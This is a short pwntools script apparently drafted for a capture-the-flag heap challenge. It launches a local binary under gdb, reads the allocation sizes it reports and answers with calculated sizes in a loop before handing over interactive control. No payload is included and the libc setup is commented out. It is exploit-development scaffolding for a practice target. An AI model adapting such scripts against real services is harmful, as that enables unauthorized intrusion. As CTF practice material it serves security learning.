from pwn import *
#libc=ELF('/lib/x86_64-linux-gun/libc-2.23.so')
#log.warning(hex(base))
context.log_level='debug'
p=process('./chall')
gdb.attach(p,'')
p.sendlineafter("er:",str(0x21))
for x in range(15):
	p.readuntil("loc(")
	size=int(p.readuntil(")")[:-1],16)
	p.sendlineafter("er:",str(((size+7)//16+1)*16+1))
#p.sendlineafter("er:",str(0x21))
p.interactive()
